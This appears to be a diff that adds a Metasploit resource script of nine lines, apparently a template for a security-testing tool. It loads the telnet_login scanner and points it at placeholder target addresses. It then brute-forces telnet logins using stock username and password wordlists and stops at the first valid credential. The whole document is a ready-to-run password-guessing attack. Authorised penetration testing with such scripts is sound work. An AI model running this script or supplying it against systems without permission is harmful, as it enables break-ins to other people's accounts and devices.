@@ -1,0 +1,9 @@
+use auxiliary/scanner/telnet/telnet_login
+set RHOSTS %%TARGET_IP%%
+set RPORT %%TARGET_PORT%%
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE true
+set STOP_ON_SUCCESS true
+set THREADS 4
+run
